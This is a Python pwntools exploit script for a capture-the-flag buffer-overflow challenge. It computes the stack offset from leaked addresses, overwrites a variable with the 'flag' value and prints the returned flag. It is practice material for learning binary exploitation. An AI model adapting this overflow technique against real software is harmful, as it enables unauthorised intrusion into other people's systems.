#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./vuln.exe --host 127.0.0.1 --port 1234
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./bof.exe')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'thekidofarcrania.com'
port = int(args.PORT or 35235)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def find_offset():
    # open next tube
    # Find the base address of buffer
    # base address is printed to stdout; just grab it
    io = start()
    offset = 0
    io.recvuntil(b'Input some text:')
    io.sendline(b'AAAA')
    begin = 0
    end = 0
    while True:
        line = io.recvline()
        #print('line = ', line.decode('utf-8'))
        if line.find(b'41') > 0: # search for A 41 in hex
            begin = line.split()[0].strip() # split
        if b'ef' in line: # serach for 0xdeadbeef
            end = line.split(b' ')[0].strip()
        if begin and end:
            break    # open next tube
    print(f'{begin=}, {end=}')
    offset = int(end, 16) - int(begin, 16)
    io.close()
    return offset

def get_flag(offset):
    # create payload with right secret
    secret = p32(0x67616c66) # hex for flag
    payload = flat({
        offset: secret
    }, filler='A')
    log.info(f'{payload=}')
    io = start()
    io.recvuntil(b'Input some text:')
    io.sendline(payload)
    io.recvuntil(b'You did it! Congratuations!\n')
    flag = io.recvline()
    io.close()
    return flag.decode('utf-8')


def solve():
    offset = find_offset()
    print(f'{offset=}')
    print(get_flag(offset))


if __name__ == "__main__":
    solve()